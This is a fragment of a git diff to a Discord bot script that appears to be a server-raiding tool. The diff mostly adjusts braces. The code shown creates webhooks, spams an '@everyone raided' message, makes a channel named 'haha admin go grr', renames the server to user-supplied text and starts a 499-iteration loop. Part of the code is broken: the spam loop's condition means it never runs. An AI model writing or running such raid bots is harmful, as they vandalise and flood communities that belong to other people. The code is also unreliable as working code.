@@ -32,8 +32,9 @@ client.on("message", async (message) => {
                             const case1hook = new Discord.WebhookClient(w.id, w.token)
                             for(let hokeii = 0; hokeii == 5; hokeii++) m.channel.send(`@everyone raided epicclly by padero's private chimera girl`)
                         })
+                    })
                     message.guild.createChannel('haha admin go grr', 'voice')
-                }
+                 }
             } else {
                 message.guild.setName(`${args.slice(0).join(' ')}`)
                 for(i = 0; i < 499; i++){
